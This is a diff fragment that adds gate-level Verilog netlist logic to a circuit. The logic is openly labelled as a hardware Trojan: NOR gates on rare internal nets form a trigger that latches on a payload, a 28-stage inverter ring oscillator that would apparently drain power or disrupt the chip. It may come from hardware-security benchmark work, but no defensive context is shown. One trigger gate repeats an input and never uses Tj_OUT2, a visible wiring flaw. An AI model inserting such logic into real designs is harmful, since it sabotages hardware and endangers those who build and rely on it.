@@ -1,0 +1,48 @@
+  NOR2X0 Trojan1 (.IN1(n4037), .IN2(n4043), .QN(Tj_OUT1));
+  NOR2X0 Trojan2 (.IN1(n4034), .IN2(n4033), .QN(Tj_OUT2));
+  NOR2X0 Trojan3 (.IN1(n4046), .IN2(n4038), .QN(Tj_OUT3));
+  NOR2X0 Trojan4 (.IN1(n2568), .IN2(n3457), .QN(Tj_OUT4));
+  NOR4X0 Trojan1234_NOT (.IN1(Tj_OUT1), .IN2(Tj_OUT1), .IN3(Tj_OUT3), .IN4(Tj_OUT4), .QN(Tj_OUT1234));
+
+  NOR2X0 Trojan5 (.IN1(n3478), .IN2(n3469), .QN(Tj_OUT5));
+  NOR2X0 Trojan6 (.IN1(n3445), .IN2(n3212), .QN(Tj_OUT6));
+  NOR2X0 Trojan7 (.IN1(n3237), .IN2(n3225), .QN(Tj_OUT7));
+  NOR2X0 Trojan8 (.IN1(n3196), .IN2(n3417), .QN(Tj_OUT8));
+  NOR4X0 Trojan5678_NOT (.IN1(Tj_OUT5), .IN2(Tj_OUT6), .IN3(Tj_OUT7), .IN4(Tj_OUT8), .QN(Tj_OUT5678));
+
+  AND2X1 Trojan_CLK_NOT (.IN1(Tj_OUT1234), .IN2(Tj_OUT5678), .Q(Tj_Trigger) );
+
+  DFFX2 Trojan_Payload1 (.CLK(Tj_Trigger), .D(1'b1), .Q(RingOscENable1));
+  DFFX2 Trojan_Payload2 (.CLK(Tj_Trigger), .D(1'b0), .QN(RingOscENable2));
+  DFFX2 Trojan_Payload3 (.CLK(Tj_Trigger), .D(1'b1), .Q(RingOscENable3));
+  AND3X4 Trojan_Payload (.IN1(RingOscENable1), .IN2(RingOscENable2), .IN3(RingOscENable3), .Q(RingOscENable));
+
+  NAND3X1 TrojanEnableGATE (.IN1(Out29), .IN2(RingOscENable), .IN3(g16692), .QN(Out1)); 
+  INVX8 Ring_Inv1 (.IN(Out1), .QN(Out2));
+  INVX8 Ring_Inv2 (.IN(Out2), .QN(Out3));
+  INVX8 Ring_Inv3 (.IN(Out3), .QN(Out4));
+  INVX8 Ring_Inv4 (.IN(Out4), .QN(Out5));
+  INVX8 Ring_Inv5 (.IN(Out5), .QN(Out6));
+  INVX8 Ring_Inv6 (.IN(Out6), .QN(Out7));
+  INVX8 Ring_Inv7 (.IN(Out7), .QN(Out8));
+  INVX8 Ring_Inv8 (.IN(Out8), .QN(Out9));
+  INVX8 Ring_Inv9 (.IN(Out9), .QN(Out10));
+  INVX8 Ring_Inv10 (.IN(Out10), .QN(Out11));
+  INVX8 Ring_Inv11 (.IN(Out11), .QN(Out12));
+  INVX8 Ring_Inv12 (.IN(Out12), .QN(Out13));
+  INVX8 Ring_Inv13 (.IN(Out13), .QN(Out14));
+  INVX8 Ring_Inv14 (.IN(Out14), .QN(Out15));
+  INVX8 Ring_Inv15 (.IN(Out15), .QN(Out16));
+  INVX8 Ring_Inv16 (.IN(Out16), .QN(Out17));
+  INVX8 Ring_Inv17 (.IN(Out17), .QN(Out18));
+  INVX8 Ring_Inv18 (.IN(Out18), .QN(Out19));
+  INVX8 Ring_Inv19 (.IN(Out19), .QN(Out20));
+  INVX8 Ring_Inv20 (.IN(Out20), .QN(Out21));
+  INVX8 Ring_Inv21 (.IN(Out21), .QN(Out22));
+  INVX8 Ring_Inv22 (.IN(Out22), .QN(Out23));
+  INVX8 Ring_Inv23 (.IN(Out23), .QN(Out24));
+  INVX8 Ring_Inv24 (.IN(Out24), .QN(Out25));
+  INVX8 Ring_Inv25 (.IN(Out25), .QN(Out26));
+  INVX8 Ring_Inv26 (.IN(Out26), .QN(Out27));
+  INVX8 Ring_Inv27 (.IN(Out27), .QN(Out28));
+  INVX8 Ring_Inv28 (.IN(Out28), .QN(Out29));
